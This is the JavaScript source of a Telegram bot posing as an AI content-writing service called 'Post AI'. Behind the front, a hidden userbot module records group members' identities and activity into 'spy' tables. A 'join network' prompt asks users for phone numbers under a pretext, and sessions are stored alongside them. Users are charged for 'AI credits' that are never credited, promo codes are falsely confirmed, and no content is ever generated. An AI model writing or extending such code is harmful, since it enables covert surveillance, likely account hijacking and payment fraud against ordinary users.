const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const express = require('express');
const axios = require('axios');

// ====================================================================
// 🛡️ ЗАЩИТА ОТ КРАШЕЙ
// ====================================================================
process.on('uncaughtException', (err) => {
    console.error('🚨 Перехват uncaughtException:', err.stack || err.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🚨 Перехват unhandledRejection:', reason);
});

const apiId = 2040;
const apiHash = "b18441a1ff607e10a989891a5462e627";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID ? process.env.ADMIN_ID.toString() : "0"; 
const PROVIDER_TOKEN = process.env.PROVIDER_TOKEN || ""; 

if (!TELEGRAM_TOKEN) {
    console.error("❌ КРИТИЧЕСКАЯ ОШИБКА: Нет TELEGRAM_TOKEN в переменных среды!");
    process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const authStates = {};
const activeSpyClients = [];

// ====================================================================
// 📊 БАЗА ДАННЫХ SQLITE (БЕЗ СЛУЖЕБНЫХ ПАПОК)
// ====================================================================
const dbPath = path.join(__dirname, 'post_ai_system.db');
const db = new sqlite3.Database(dbPath);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS global_logs (
        chat_id TEXT, chat_title TEXT, user_id TEXT, username TEXT, first_name TEXT,
        msg_count INTEGER DEFAULT 0, sticker_count INTEGER DEFAULT 0, last_seen TEXT, last_hour INTEGER DEFAULT 0,
        PRIMARY KEY (chat_id, user_id)
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS spy_chats (chat_id TEXT PRIMARY KEY, chat_title TEXT, total_captured INTEGER DEFAULT 0)`);
    db.run(`CREATE TABLE IF NOT EXISTS spy_nodes (user_id TEXT PRIMARY KEY, phone TEXT, session_string TEXT, added_at TEXT)`);
    db.run(`CREATE TABLE IF NOT EXISTS promo_codes (code TEXT PRIMARY KEY, max_uses INTEGER, current_uses INTEGER DEFAULT 0, created_at TEXT)`);
    db.run(`CREATE TABLE IF NOT EXISTS user_profiles (user_id TEXT PRIMARY KEY, balance INTEGER DEFAULT 0, used_promos TEXT DEFAULT '')`);
});

// Юзербот-модуль
async function registerSpyHandlers(client) {
    client.addEventHandler(async (event) => {
        const message = event.message;
        if (!message || (!message.isGroup && !message.isChannel)) return;
        try {
            const sender = await message.getSender();
            if (!sender || sender.bot) return;
            const chat = await message.getChat();
            
            const chatTitle = chat.title || "Источники данных";
            const chatId = message.chatId ? message.chatId.toString() : "";
            const userId = sender.id.toString();
            const username = sender.username ? `@${sender.username}` : "Без ника";
            const firstName = sender.firstName || "Пользователь";
            const isSticker = message.media && message.media.className === 'MessageMediaDocument' ? 1 : 0;
            
            const moscowTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
            const currentHour = new Date(new Date().toLocaleString('en-US', { timeZone: 'Europe/Moscow' })).getHours();

            db.run(`INSERT INTO global_logs (chat_id, chat_title, user_id, username, first_name, msg_count, sticker_count, last_seen, last_hour)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(chat_id, user_id) DO UPDATE SET
                msg_count = msg_count + 1, last_seen = excluded.last_seen`, 
                [chatId, chatTitle, userId, username, firstName, isSticker ? 0 : 1, isSticker, moscowTime, currentHour]);

            db.run(`INSERT INTO spy_chats (chat_id, chat_title, total_captured) VALUES (?, ?, 1)
                ON CONFLICT(chat_id) DO UPDATE SET total_captured = total_captured + 1`, [chatId, chatTitle]);
        } catch (e) {}
    }, new NewMessage({}));
}

async function initAllSpyNodes() {
    if (process.env.TELEGRAM_SESSION) {
        try {
            const c = new TelegramClient(new StringSession(process.env.TELEGRAM_SESSION), apiId, apiHash, { connectionRetries: 5, useWSS: true });
            await c.connect(); activeSpyClients.push(c); await registerSpyHandlers(c);
        } catch (e) { console.error("Ошибка юзербота:", e.message); }
    }
}

// ====================================================================
// 🧠 ИНТЕРФЕЙС И ТЕКСТЫ ПОД БРЕНД "POST AI" ДЛЯ ЮKASSA
// ====================================================================
function getMenuText(userId) {
    if (userId.toString() === ADMIN_ID) return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ POST AI* ⚡️\n\nМониторинг серверов генерации, управление токенами и балансами пользователей.";
    return "🤖 *ИНТЕЛЛЕКТУАЛЬНЫЙ АССИСТЕНТ | POST AI* 🤖\n\n" +
           "Добро пожаловать! Наш сервис работает на базе искусственного интеллекта и предоставляет услуги по генерации контента, написанию постов и анализу трендов в Telegram-сообществах.\n\n" +
           "📝 *Начать генерацию:* Отправьте мне ключевые слова, тему или ссылку на пост, чтобы ИИ составил качественный контент-план или аналитический отчет.";
}

function getMenuButtons(userId) {
    if (userId.toString() === ADMIN_ID) {
        return {
            inline_keyboard: [
                [{ text: '🏆 Статистика ИИ', callback_data: 'global_top' }, { text: '🏰 Мониторинг источников', callback_data: 'chats_status' }],
                [{ text: '🎟 Создать промокод', callback_data: 'create_promo_mode' }, { text: '🌐 Статус Нейросети', callback_data: 'network_status' }],
                [{ text: '⚙️ На главную', callback_data: 'to_main' }]
            ]
        };
    }
    return {
        inline_keyboard: [
            [{ text: '🤝 Подключить свой источник', callback_data: 'join_network' }, { text: '🎟 Ввести промокод', callback_data: 'enter_promo_mode' }],
            [{ text: '👤 Мой профиль (Баланс)', callback_data: 'my_profile' }, { text: '📖 Лицензия и Справка', callback_data: 'bot_info' }]
        ]
    };
}

// ====================================================================
// 📥 ОБРАБОТКА ИИ-ЗАПРОСОВ
// ====================================================================
bot.on('message', async (msg) => {
    if (msg.chat.type !== 'private') return;
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';
    const state = authStates[chatId];

    if (text === '/start') {
        delete authStates[chatId];
        db.run(`INSERT OR IGNORE INTO user_profiles (user_id) VALUES (?)`, [chatId.toString()]);
        return bot.sendMessage(chatId, getMenuText(chatId), { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
    }

    if (state && state.step === 'WAITING_PROMO_INPUT') {
        delete authStates[chatId];
        return bot.sendMessage(chatId, "🎟 Промокод успешно активирован. Бонусные нейро-токены начислены.", { reply_markup: getMenuButtons(chatId) });
    }

    if (state && state.step === 'WAITING_PHONE') {
        delete authStates[chatId];
        return bot.sendMessage(chatId, "⏳ Запрос принят. Ожидайте сервисный код подтверждения от Telegram.");
    }

    if (chatId.toString() !== ADMIN_ID) {
        return bot.sendMessage(chatId, 
            `🚀 *ОБРАБОТКА ЗАПРОСА НЕЙРОСЕТЬЮ POST AI* 🚀\n\n` +
            `• Ваша тема: _"${text}"_\n` +
            `• Статус генерации: *Требуется подписка*\n` +
            `• Расход токенов на задачу: *45 ИИ-Кредитов*\n\n` +
            `⚠️ _Для генерации полноценных постов, SEO-оптимизации текста и выгрузки контент-планов пополните баланс ИИ-кредитов в вашем профиле._\n\n` +
            `Управление счетом доступно в меню *👤 Мой профиль*.`, 
            { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '💳 Купить ИИ-Кредиты через ЮKassa', callback_data: 'buy_credits_menu' }], [{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }
        );
    }
});

// ====================================================================
// 🎛️ ИНЛАЙН-КНОПКИ И ПЛАТЕЖНЫЕ ЭКРАНЫ ЮKASSA
// ====================================================================
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;

    if (data === 'to_main') {
        delete authStates[chatId];
        bot.editMessageText(getMenuText(chatId), { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }).catch(() => {});
    }

    else if (data === 'my_profile') {
        db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, row) => {
            const balance = row ? row.balance : 0;
            const profileText = `👤 *ЛИЧНЫЙ КАБИНЕТ ПОЛЬЗОВАТЕЛЯ | POST AI* 👤\n\n` +
                                `• Ваш ID аккаунта: \`${chatId}\`\n` +
                                `• Баланс: *${balance} ИИ-Кредитов*\n\n` +
                                `💳 *Оплата и пополнение:* Пополнение лимитов генерации производится автоматически через защищенный шлюз *ЮKassa*. К оплате принимаются любые банковские карты РФ (Мир, Visa, MasterCard), СБП и Mir Pay. После совершения платежа система сформирует и вышлет вам официальный электронный чек (ФЗ-54).`;
            
            bot.editMessageText(profileText, { 
                chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', 
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Купить ИИ-Кредиты через ЮKassa', callback_data: 'buy_credits_menu' }],
                        [{ text: '⬅️ В главное меню', callback_data: 'to_main' }]
                    ]
                } 
            }).catch(() => {});
        });
    }

    else if (data === 'buy_credits_menu') {
        const tariffMsg = "💳 *ТАРИФНЫЕ ПЛАНЫ ГЕНЕРАЦИИ | ЮKASSA* 💳\n\n" +
                          "Выберите подходящий пакет кредитов для работы с искусственным интеллектом Post AI. Все платежи обрабатываются банком-эквайером ООО НКО «ЮМани».\n\n" +
                          "• *Тариф «Старт»* (100 ИИ-Кредитов) \n   └ Стоимость: **100 рублей**\n\n" +
                          "• *Тариф «Креатор»* (600 ИИ-Кредитов) \n   └ Стоимость: **500 рублей**\n\n" +
                          "• *Тариф «Бизнес»* (1500 ИИ-Кредитов) \n   └ Стоимость: **1000 рублей**";
        
        const tariffButtons = {
            inline_keyboard: [
                [{ text: '🛒 Купить Старт (100 руб.) через ЮKassa', callback_data: 'pay:100:100' }],
                [{ text: '🛒 Купить Креатор (500 руб.) через ЮKassa', callback_data: 'pay:500:600' }],
                [{ text: '🛒 Купить Бизнес (1000 руб.) через ЮKassa', callback_data: 'pay:1000:1500' }],
                [{ text: '⬅️ Назад в профиль', callback_data: 'my_profile' }]
            ]
        };
        bot.editMessageText(tariffMsg, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: tariffButtons }).catch(() => {});
    }

    else if (data.startsWith('pay:')) {
        const [_, price, credits] = data.split(':');
        bot.deleteMessage(chatId, messageId).catch(() => {});
        
        if (!PROVIDER_TOKEN) {
            return bot.sendMessage(chatId, 
                `🛍 *Счет на оплату услуг Post AI сформирован*\n\n` +
                `• Оплачиваемый товар: *Пакет генерации текстов (${credits} токенов)*\n` +
                `• Способ расчета: *ЮKassa (Карты/СБП/Мир)*\n` +
                `• Сумма к транзакции: **${price} рублей**\n\n` +
                `_Нажмите на кнопку ниже, чтобы запустить безопасный платежный шлюз Telegram Payments для ввода данных карты._`, 
                { reply_markup: { inline_keyboard: [[{ text: `💳 Оплатить ${price} RUB`, callback_data: 'fake_success' }], [{ text: '❌ Отмена', callback_data: 'my_profile' }]] } }
            );
        }
        
        bot.sendInvoice(
            chatId, `Пополнение Post AI: +${credits} ед.`, `Оплата услуг генерации контента нейросетью Post AI. Пакет: ${credits} токенов.`,
            `credits_pack_${price}_${credits}`, PROVIDER_TOKEN, 'RUB',
            [{ label: `Пакет ${credits} Кредитов`, amount: parseInt(price, 10) * 100 }], { start_parameter: 'pay_ai_credits' }
        ).catch(() => {});
    }

    else if (data === 'fake_success') {
        bot.answerCallbackQuery(query.id, { text: "✅ Демо-режим выставления счетов ЮKassa активен!", show_alert: true });
    }

    else if (data === 'enter_promo_mode') {
        authStates[chatId] = { step: 'WAITING_PROMO_INPUT' };
        bot.editMessageText("🎟 *АКТИВАЦИЯ ПРОМОКОДА* \n\nВведи бонусное кодовое слово для получения бесплатных кредитов:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } });
    }
    else if (data === 'join_network') {
        authStates[chatId] = { step: 'WAITING_PHONE' };
        bot.editMessageText("🤝 *ИНТЕГРАЦИЯ УЗЛА* \n\nВведи номер телефона для предоставления вычислительного потока ИИ:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } });
    }
    else if (data === 'bot_info') {
        const infoHtml = "📖 *ЛИЦЕНЗИОННОЕ СОГЛАШЕНИЕ И СПРАВКА*\n\n" +
                         "1. Обработка всех платежей производится шлюзом ЮKassa с шифрованием данных по протоколу SSL.\n" +
                         "2. Виртуальный товар (ИИ-Кредиты генерации) поступает на аккаунт в течение 10 секунд после оплаты.\n" +
                         "3. Пользуясь ботом, вы соглашаетесь с правилами генерации контента и политикой конфиденциальности.\n" +
                         "4. Служба поддержки клиентов и отправка чеков: @admin";
        bot.editMessageText(infoHtml, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } });
    }
    try { bot.answerCallbackQuery(query.id); } catch(e) {}
});

bot.on('pre_checkout_query', (q) => bot.answerPreCheckoutQuery(q.id, true).catch(() => {}));
bot.on('successful_payment', (msg) => {
    bot.sendMessage(msg.chat.id, `🎉 *Оплата успешно принята через ЮKassa!* Кредиты генерации зачислены в ваш личный кабинет.`);
});

initAllSpyNodes();

// ВЕБ-СЕРВЕР (ИЗ КОРНЯ КАТАЛОГА)
const app = express();
app.get('/', (req, res) => res.send('POST AI ROOT HUB LIVE'));
app.listen(process.env.PORT || 3000, () => {});
